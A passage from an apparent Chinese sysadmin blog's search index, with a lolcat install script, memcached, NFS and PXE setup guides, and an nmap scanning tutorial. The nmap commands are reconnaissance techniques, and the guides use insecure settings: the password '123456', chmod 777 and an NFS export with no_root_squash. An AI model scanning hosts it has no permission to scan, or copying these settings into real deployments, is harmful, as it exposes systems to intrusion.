class="line">fi</span><br><span class="line">yum install -y ruby gem wget unzip &amp;&gt;/dev/null</span><br><span class="line">ruby --version</span><br><span class="line">gem --version</span><br><span class="line">if [[ $? -ne 0 ]];then</span><br><span class="line">echo_failure || echo &quot;程序异常&quot;</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line">wget https://github.com/busyloop/lolcat/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line"></span><br><span class="line">cd  lolcat-master &amp;&amp; echo &quot;当前路径为 $dp&quot;</span><br><span class="line">echo &quot;开始执行编译，请稍后。。。&quot; </span><br><span class="line">gem install lolcat</span><br><span class="line">if [[ $? -ne 0 ]];then</span><br><span class="line">return 126</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line">function clean()&#123;</span><br><span class="line">rm -rvf /opt/lolcat-master /opt/master.zip</span><br><span class="line">&#125;</span><br><span class="line">function main()&#123;</span><br><span class="line">path</span><br><span class="line">lolcat_down</span><br><span class="line">if [[ $? -eq 126 ]];then</span><br><span class="line">echo &quot;程序错误,清理环境中&quot;</span><br><span class="line">clean</span><br><span class="line">exit 211</span><br><span class="line">fi</span><br><span class="line">/opt/lolcat-master/bin/lolcat /etc/passwd &amp;&gt;/dev/null</span><br><span class="line">if [[ $? -eq 0 ]];then</span><br><span class="line">ln -s /opt/lolcat-master/bin/lolcat /usr/bin/lolcat</span><br><span class="line">else</span><br><span class="line">echo_failure || echo &quot;程序异常&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line">echo &quot;lolcat 程序安装完成&quot; | lolcat</span><br><span class="line">&#125;</span><br><span class="line">main</span><br><span class="line">if [[ $? -eq 0 ]];then</span><br><span class="line">read -p &quot;是否进行自动安装,是输入yes 否输入任意键&quot; d</span><br><span class="line">case $d in </span><br><span class="line">YES|yes)</span><br><span class="line">. hello.sh</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;退出程序并清理环境&quot;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">fi</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 开发 </tag>
            
            <tag> shell </tag>
            
            <tag> 趣味 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>memcached 缓存</title>
      <link href="2020/12/04/Memcached_%E5%AE%9E%E6%88%98/"/>
      <url>2020/12/04/Memcached_%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="LAMP架构调整添加memcached缓存"><a href="#LAMP架构调整添加memcached缓存" class="headerlink" title="LAMP架构调整添加memcached缓存"></a>LAMP架构调整添加memcached缓存</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">环境：centos7.6、php7、mariadb5.5、memcached1.4.15</span><br><span class="line">by newrain </span><br></pre></td></tr></table></figure><h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装memcached</span></span><br><span class="line">[root@memcached ~]# yum install memcached -y</span><br><span class="line">[root@memcached ~]# systemctl start memcached  #启动</span><br><span class="line">[root@memcached ~]# cat /etc/sysconfig/memcached </span><br><span class="line">PORT=&quot;11211&quot;  # 监听端口</span><br><span class="line">USER=&quot;memcached&quot;  # 用户</span><br><span class="line">MAXCONN=&quot;1024&quot;    # 最大并发数</span><br><span class="line">CACHESIZE=&quot;64&quot;    # 分配内存大小</span><br><span class="line">OPTIONS=&quot;&quot;        # 监听网络地址</span><br><span class="line"></span><br><span class="line">[root@memcached ~]# yum install -y telnet   #安装telent</span><br><span class="line">[root@memcached ~]# telnet 192.168.246.188 11211</span><br><span class="line">Trying 192.168.246.188...</span><br><span class="line">Connected to 192.168.246.188.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">set name 0 60 8    #设置名称为name的key</span><br><span class="line">newrain        #给name的值</span><br><span class="line">STORED         #出现stoped表示已经存储成功。</span><br><span class="line">get name       #查询key值</span><br><span class="line">VALUE name 0 8</span><br><span class="line">newrain</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装php7</span></span><br><span class="line">[root@memcached ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm</span><br><span class="line">[root@memcached ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">[root@memcached ~]# yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64 php70w-devel zlib-devel  -y</span><br><span class="line">[root@memcached ~]# yum -y install php70w-fpm</span><br><span class="line">[root@memcached ~]# yum install -y make gcc zlib-devel libmemcached-devel git</span><br><span class="line">下载PHP Memcache 扩展包</span><br><span class="line">[root@memcached ~]# git clone https://github.com/websupport-sk/pecl-memcache   #php7的mem扩展</span><br><span class="line">[root@memcached ~]# cd pecl-memcache/</span><br><span class="line">[root@memcached pecl-memcache]# /usr/bin/phpize </span><br><span class="line">Configuring for:</span><br><span class="line">PHP Api Version:         20151012</span><br><span class="line">Zend Module Api No:      20151012</span><br><span class="line">Zend Extension Api No:   320151012</span><br><span class="line">[root@memcached pecl-memcache]# ./configure --with-php-config=/usr/bin/php-config</span><br><span class="line">[root@memcached pecl-memcache]# make &amp;&amp; cp modules/memcache.so  /usr/lib64/php/modules/</span><br><span class="line">[root@memcached pecl-memcache]# vim /etc/php.ini</span><br><span class="line">添加  extension=memcache.so</span><br><span class="line">[root@memcached pecl-memcache]# systemctl restart php-fpm</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装数据库 mariadb</span></span><br><span class="line">[root@memcached ~]# yum install -y mariadb mariadb-server</span><br><span class="line">[root@memcached ~]# systemctl start mariadb</span><br><span class="line">[root@memcached ~]# mysqladmin password 123456</span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入测试数据</span></span><br><span class="line">https://blog.csdn.net/NewRain_wang/article/details/103541196</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装apache 服务</span></span><br><span class="line">[root@memcached ~]# yum install -y httpd</span><br><span class="line">[root@memcached ~]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">修改下列配置，支持php</span><br><span class="line">DirectoryIndex index.html index.php</span><br><span class="line">[root@memcached ~]# systemctl start httpd</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署完成</span></span><br></pre></td></tr></table></figure><h5 id="缓存数据测试"><a href="#缓存数据测试" class="headerlink" title="缓存数据测试"></a>缓存数据测试</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@memcached html]<span class="comment"># vim /var/www/html/test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$memcachehost</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>; <span class="comment"># 配置memcached</span></span><br><span class="line"><span class="variable">$memcacheport</span> = <span class="number">11211</span>;</span><br><span class="line"><span class="variable">$memcachelife</span> = <span class="number">60</span>;</span><br><span class="line"><span class="variable">$memcache</span> = <span class="keyword">new</span> Memcache;</span><br><span class="line"><span class="variable">$memcache</span>-&gt;connect(<span class="variable">$memcachehost</span>,<span class="variable">$memcacheport</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Could not connect&quot;</span>);</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select emp_no,salary from salaries where emp_no = 10001&quot;</span>; </span><br><span class="line"><span class="variable">$key</span>=md5(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$memcache</span>-&gt;get(<span class="variable">$key</span>))</span><br><span class="line">&#123;</span><br><span class="line">                <span class="variable">$conn</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;employees&quot;</span>); <span class="comment"># 配置mysql</span></span><br><span class="line">                <span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="variable">$arr</span>[]=<span class="variable">$row</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$f</span> = <span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">                <span class="variable">$memcache</span>-&gt;add(<span class="variable">$key</span>,serialize(<span class="variable">$arr</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$arr</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="string">&#x27;memcache&#x27;</span>;</span><br><span class="line">        <span class="variable">$data_mem</span>=<span class="variable">$memcache</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$data</span> = unserialize(<span class="variable">$data_mem</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$key</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;key is  &lt;b&gt;&lt;font color=#FF0000&gt;<span class="subst">$a</span>[emp_no]&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;value is &lt;b&gt;&lt;font color=#FF0000&gt;<span class="subst">$a</span>[salary]&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 源代码出处 https://my.oschina.net/kcw/blog/311411 感谢</span></span><br></pre></td></tr></table></figure><h5 id="浏览器访问"><a href="#浏览器访问" class="headerlink" title="浏览器访问"></a>浏览器访问</h5><ul><li>当从数据库中访问数据时<br><img src="https://img-blog.csdnimg.cn/20191214170820729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>当从缓存数据库中访问数据时<br><img src="https://img-blog.csdnimg.cn/20191214170756839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 缓存 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nfs 网络文件系统</title>
      <link href="2020/12/04/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>2020/12/04/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（Network File System）即网络文件系统，它允许网络中的不同计算机相互之间共享资源。NFS客户端可以透明地读写远程NFS服务器上的文件，就像访问本地文件一样。</span><br><span class="line"></span><br><span class="line">NFS是1980年由SUN发展出来在UNIX&amp;Linux系统间实现文件共享的一种方法。它支持应用程序在客户端通过网络存取位于服务器磁盘中的数据。</span><br><span class="line">   NFS只提供网络文件共享功能，不提供数据传输的功能。需要借助RPC(Remote Procedure Calls)远程过程调用协议实现数据传输。</span><br><span class="line">   NFS服务器自开启服务之后一直处于等待状态，由NFS客户端建立过程调用请求，将调用参数发送到远程NFS服务器，并等待响应。当请求到达远程NFS服务器后，NFS服务器处理客户端的请求，调用指定的程序，并将结果返回NFS客户端。NFS服务器上的目录如果可以被过程用户访问，就称为导出（export）；客户主机访问服务器导出目录的过程称为挂载（mount）或导入（import）。</span><br><span class="line">NFS的工作流程</span><br><span class="line">   步骤1：首先用户访问NFS共享资源，由程序在NFS客户端上发出NFS文件存取功能的询问请求，这时NFS客户端（即执行程序的服务器）RPC服务（portmap 或rpcbind服务）就会通过网络向NFS服务端的RPC服务（即portmap或rpcbind服务）的111端口发出NFS文件存取功能的询问请求。</span><br><span class="line">   步骤2：NFS服务端的RPC服务（即portmap或rpcbind服务）找到对应的已注册的NFSdaemon端口后，通知NFS客户端的RPC服务（即portmap或rpcbind服务）。</span><br><span class="line">   步骤3：此时NFS客户端就可获取到正确的端口，然后就直接与NFS daemon联机存取数据了。</span><br><span class="line">   步骤4：NFS客户端把数据存取成功后，告诉用户存取结果。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="部署nfs服务端"><a href="#部署nfs服务端" class="headerlink" title="部署nfs服务端"></a>部署nfs服务端</h2><ol><li>安装包<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install nfs-utils rpcbind</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>启动服务，并做开机启动<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@nfs_server ~]# systemctl enable rpcbind</span><br><span class="line">[root@nfs_server ~]# systemctl enable nfs-server</span><br><span class="line">Created symlink from &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;nfs-server.service to &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;nfs-server.service.</span><br><span class="line">[root@nfs_server ~]# systemctl enable nfs-lock</span><br><span class="line">[root@nfs_server ~]# systemctl enable nfs-idmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@nfs_server ~]# systemctl start rpcbind</span><br><span class="line">[root@nfs_server ~]# systemctl start nfs-server</span><br><span class="line">[root@nfs_server ~]# systemctl start nfs-lock</span><br><span class="line">[root@nfs_server ~]# systemctl start nfs-idmap</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>3.创建共享目录，并修改权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_server ~]# mkdir -p &#x2F;application&#x2F;share            </span><br><span class="line">[root@nfs_server ~]# chmod -R 777 &#x2F;application&#x2F;share  </span><br></pre></td></tr></table></figure><p>4.配置共享目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_server ~]# echo &quot;&#x2F;application&#x2F;share 192.168.0.*(rw,sync,no_root_squash)&quot; &gt;&gt; &#x2F;etc&#x2F;exports</span><br><span class="line">[root@nfs_server ~]# exportfs -a</span><br><span class="line">使exports的修改生效</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.检查配置是否设置正确</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_server &#x2F;]# showmount -e</span><br><span class="line">Export list for nfs_server:</span><br><span class="line">&#x2F;application&#x2F;share 192.168.0.*</span><br></pre></td></tr></table></figure><h2 id="部署nfs客户端"><a href="#部署nfs客户端" class="headerlink" title="部署nfs客户端"></a>部署nfs客户端</h2><p>1.安装包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_client ~]# yum -y install nfs-utils</span><br></pre></td></tr></table></figure><p>2.检查共享目录是否正确</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_client ~]# showmount -e 192.168.0.240</span><br><span class="line">Export list for 192.168.0.240:</span><br><span class="line">&#x2F;application&#x2F;share 192.168.0.*</span><br></pre></td></tr></table></figure><p>3.创建一个挂载点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_client ~]# mkdir -p &#x2F;application&#x2F;share</span><br></pre></td></tr></table></figure><p>4.挂载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@nfs_client ~]# mount -t nfs 192.168.0.240:&#x2F;application&#x2F;share &#x2F;application&#x2F;share</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.永久挂载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line">添加   192.168.0.240:&#x2F;application&#x2F;share &#x2F;application&#x2F;share nfs defaults 0 0</span><br></pre></td></tr></table></figure><p>挂载格式解读：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs -o nolock,vers&#x3D;2 10.0.0.147:&#x2F;work&#x2F;nfs &#x2F;mnt</span><br><span class="line"></span><br><span class="line">解释一下：</span><br><span class="line">mount :挂载命令</span><br><span class="line">nfs :使用的协议</span><br><span class="line">nolock :不阻塞</span><br><span class="line">vers : 使用的NFS版本号</span><br><span class="line">IP : NFS服务器的IP（NFS服务器运行在哪个系统上，就是哪个系统的IP）</span><br><span class="line">&#x2F;work&#x2F;nfs: 要挂载的目录（Ubuntu的目录）</span><br><span class="line">&#x2F;mnt : 要挂载到的目录（开发板上的目录，注意挂载成功后，&#x2F;mnt下原有数据将会被隐藏，无法找到）</span><br><span class="line"></span><br><span class="line">取消挂载(先df -h 查看分区挂载情况)</span><br><span class="line">[root@localhost local]# umount 192.168.0.240:&#x2F;application&#x2F;share</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 文件系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NMAP 嗅探工具</title>
      <link href="2020/12/04/NMAP_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/NMAP_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>@[toc]</p><blockquote><blockquote><p>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p></blockquote><blockquote><p>正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。</p></blockquote><blockquote><p>Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。</p></blockquote></blockquote><h3 id="nmap-简单扫描"><a href="#nmap-简单扫描" class="headerlink" title="nmap 简单扫描"></a>nmap 简单扫描</h3><blockquote><p>nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口<br>命令语法：<br>nmap &lt;target ip address&gt;<br>其中：target ip address是扫描的目标主机的ip地址<br>-vv 详细显示返回信息<br><img src="https://img-blog.csdnimg.cn/20201130115920871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020113013571283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-指定端口扫描"><a href="#nmap-指定端口扫描" class="headerlink" title="nmap 指定端口扫描"></a>nmap 指定端口扫描</h3><blockquote><p>命令语法：nmap -p(port1,port2,…)  &lt;target IP&gt;<br>介绍：port1,port2…为想要扫描的端口号<br><img src="https://img-blog.csdnimg.cn/20201130140028904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-ping-扫描-发现主机"><a href="#nmap-ping-扫描-发现主机" class="headerlink" title="nmap ping 扫描(发现主机)"></a>nmap ping 扫描(发现主机)</h3><blockquote><p>nmap可以利用类似windows/linux系统下的ping 方式进行扫描<br>命令语法： nmap -sP &lt;target ip&gt;<br><img src="https://img-blog.csdnimg.cn/20201130140236109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130140246208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-路由跟踪"><a href="#nmap-路由跟踪" class="headerlink" title="nmap 路由跟踪"></a>nmap 路由跟踪</h3><blockquote><p>nmap –traceroute &lt;target IP&gt;<br><img src="https://img-blog.csdnimg.cn/20201130140822924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-操作系统探测"><a href="#nmap-操作系统探测" class="headerlink" title="nmap 操作系统探测"></a>nmap 操作系统探测</h3><blockquote><p>nmap -O &lt;target ip&gt;<br><img src="https://img-blog.csdnimg.cn/2020113014153976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-万能开关"><a href="#nmap-万能开关" class="headerlink" title="nmap 万能开关"></a>nmap 万能开关</h3><blockquote><p>包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测<br>命令语法： nmap -A &lt;target ip&gt;<br><img src="https://img-blog.csdnimg.cn/20201130143109942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="nmap-版本检测"><a href="#nmap-版本检测" class="headerlink" title="nmap 版本检测"></a>nmap 版本检测</h3><blockquote><p>nmap -sV &lt;target ip&gt;<br><img src="https://img-blog.csdnimg.cn/20201130143537809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 极客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PXE+Kickstart无人值守安装操作系统</title>
      <link href="2020/12/04/PXE+Kickstart%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>2020/12/04/PXE+Kickstart%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="PXE-Kickstart无人值守安装操作系统"><a href="#PXE-Kickstart无人值守安装操作系统" class="headerlink" title="PXE+Kickstart无人值守安装操作系统"></a>PXE+Kickstart无人值守安装操作系统</h1><h5 id="什么是PXE？"><a href="#什么是PXE？" class="headerlink" title="什么是PXE？"></a>什么是PXE？</h5><p>PXE，全名Pre-boot Execution Environment，预启动执行环境；<br>通过网络接口启动计算机，不依赖本地存储设备（如硬盘）或本地已安装的操作系统；<br>由Intel和Systemsoft公司于1999年9月20日公布的技术；<br>Client/Server的工作模式；<br>PXE客户端会调用网际协议(IP)、用户数据报协议(UDP)、动态主机设定协议(DHCP)、小型文件传输协议(TFTP)等网络协议；<br>PXE客户端(client)这个术语是指机器在PXE启动过程中的角色。一个PXE客户端可以是一台服务器、笔记本电脑或者其他装有PXE启动代码的机器（我们电脑的网卡）</p><p>pxe+kickstart 全自动安装操作系统，（不包括win）<br>pxe是网卡上的芯片<br>kickstart软件   pylickstart  用来配置操作系统安装过程的配置文件ks.cfg</p><p>initrd初始化磁盘影像文件</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDYvMjIvNWQwZDE0YzY3NTFiMDY1ODMxLnBuZw?x-oss-process=image/format,png"></p><p>图中的vmlinux应该为vmliuz</p><h5 id="PXE工作原理示意图说明"><a href="#PXE工作原理示意图说明" class="headerlink" title="PXE工作原理示意图说明"></a>PXE工作原理示意图说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Client向PXE Server上的DHCP发送IP地址请求消息，DHCP检测Client是否合法（主要是检测Client的网卡MAC地址），如果合法则返回Client的IP地址，同时将启动文件pxelinux.0的位置信息一并传送给Client。</span><br><span class="line"></span><br><span class="line">2. Client向PXE Server上的TFTP发送获取pxelinux.0请求消息，TFTP接收到消息之后再向Client发送pxelinux.0大小信息，试探Client是否满意，当TFTP收到Client发回的同意大小信息之后，正式向Client发送pxelinux.0。</span><br><span class="line"></span><br><span class="line">3. Client执行接收到的pxelinux.0文件。</span><br><span class="line"></span><br><span class="line">4. Client向TFTP发送针对本机的配置信息（记录在TFTP的pxelinux.cfg目录下），TFTP将配置文件发回Client，继而Client根据配置文件执行后续操作。</span><br><span class="line"></span><br><span class="line">5. Client向TFTP发送Linux内核请求信息，TFTP接收到消息之后将内核文件发 送给Client。</span><br><span class="line"></span><br><span class="line">6. Client向TFTP发送根文件请求信息，TFTP接收到消息之后返回Linux根文件 系统。</span><br><span class="line"></span><br><span class="line">7. Client启动Linux内核（启动参数已经在4中的配置文件中设置好了）。</span><br><span class="line"></span><br><span class="line">8. Client通过NFS下载镜像文件，读取autoyast自动化安装脚本。 至此，Client正式进入自动化安装模式开始安装系统直到完成</span><br></pre></td></tr></table></figure><h5 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置网路 </span><br><span class="line">配置本地yum</span><br><span class="line"></span><br><span class="line">yum -y install dhcp  tftp tftp-server vsftpd vsftpd-server   </span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4-25&#x2F;   &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line"></span><br><span class="line">vsftd 与tftpd不同之处</span><br><span class="line"></span><br><span class="line">默认发布目录i的权限问题</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   dhcp安装和配置</span><br><span class="line"></span><br><span class="line">#cd &#x2F;etc&#x2F;dhcp</span><br><span class="line"># ls dhcpd.conf</span><br><span class="line"># cp &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4.2.5&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf </span><br><span class="line">cp：是否覆盖&quot;&#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf&quot;？ y</span><br><span class="line"></span><br><span class="line"># vim &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf </span><br><span class="line">subnet 192.168.10.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 192.168.10.3 192.168.10.88;</span><br><span class="line">  next-server 192.168.10.2;</span><br><span class="line">  filename &quot;pxelinux.0&quot;;</span><br><span class="line">  default-lease-time 600;</span><br><span class="line">  max-lease-time 7200;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip 10.18.10.104      